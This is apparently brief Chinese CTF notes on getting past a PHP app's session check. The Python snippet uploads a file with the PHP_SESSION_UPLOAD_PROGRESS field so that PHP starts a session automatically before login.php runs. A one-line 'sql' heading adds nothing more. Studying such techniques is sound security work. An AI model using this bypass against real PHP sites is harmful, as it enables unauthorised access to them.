- # 绕过session检测
	- `templates`文件夹中的所有文件都会检测session是否被开启。
	- 而只有index.php中会主动使用`session_start()`开启session
	- 我们可以通过上传文件，并附带POST参数`PHP_SESSION_UPLOAD_PROGRESS`来让PHP自动开启session
		- ```python
		  r = base_post(f"{url}/templates/login.php", params = {
		      "p": "login",
		      "username": "bbbbbbb",
		      "password": "b"
		  }, data = {
		      "PHP_SESSION_UPLOAD_PROGRESS": "123456789"
		  }, files = {
		      "file": ("a", "a")
		  })
		  print(r.text)
		  ```
- # sql
	- 模板题